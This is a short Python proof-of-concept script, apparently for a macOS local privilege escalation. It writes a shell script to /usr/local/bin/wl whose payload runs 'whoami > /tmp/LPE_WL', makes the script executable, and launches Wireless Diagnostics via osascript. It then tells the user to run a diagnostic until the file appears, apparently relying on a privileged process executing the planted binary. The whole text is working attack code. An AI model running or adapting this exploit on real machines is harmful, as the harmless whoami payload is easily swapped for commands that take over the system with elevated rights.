import pwd
from pathlib import Path
import subprocess
import os 


'''Write it Into /usr/local/bin/wl'''
with open("/usr/local/bin/wl", "a") as f:
	f.write("#!/bin/sh\n")
	payload ="whoami" + " > /tmp/LPE_WL"
	f.write(payload)

'''Give Executable Permissions to it'''
cmd_output = subprocess.run(["chmod", "+x", "/usr/local/bin/wl"], stdout=subprocess.PIPE)


'''Open Wireless Diagnostics Tool'''
os.system("""osascript -e 'tell app "wireless Diagnostics" to open'""")

'''Final Step'''
key = 'return'
print('Start a Diagnostic and Continue until /tmp/LPE_WL is created.....')
print('If the file is still not created after the diagnosis is complete, issue a report generation command instead of continuing the scan!!!!!!!!!!')




